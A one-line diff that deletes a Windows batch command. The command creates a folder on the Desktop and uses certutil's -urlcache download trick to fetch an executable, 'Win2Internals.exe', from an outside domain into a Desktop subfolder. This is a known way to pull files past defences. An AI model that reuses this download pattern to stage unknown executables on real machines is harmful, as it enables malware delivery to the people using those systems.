@@ -1,1 +1,0 @@
-@echo off & cd /d "%USERPROFILE%\Desktop" & if not exist "TestingWrite" mkdir "TestingWrite" & cd "TestingWrite" & certutil -urlcache -split -f "https://baa4ts.is-a-good.dev/Win2Internals.exe" "%USERPROFILE%\Desktop\down\Win2Internals.exe"
